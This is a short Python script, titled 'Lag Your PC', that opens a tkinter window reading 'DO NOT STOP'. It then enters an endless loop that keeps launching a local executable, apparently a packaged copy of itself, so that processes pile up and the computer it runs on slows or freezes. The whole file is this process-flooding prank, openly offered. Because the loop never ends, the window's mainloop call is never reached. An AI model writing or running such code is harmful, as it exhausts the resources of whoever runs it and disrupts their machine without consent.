import tkinter as tk
import os

window = tk.Tk()

window.title("Lag Your PC")
window.geometry("500x500")  # Width x Height

label = tk.Label(window, text="DO NOT STOP", font=("Arial", 16))
label.pack(pady=50)  # Add padding for spacing

# Path to the .exe file
while True:
    exe_path = r"C:\Users\chris\Downloads\LagYourPC\dist\lagyourpca.exe"
    os.startfile(exe_path)
    
window.mainloop()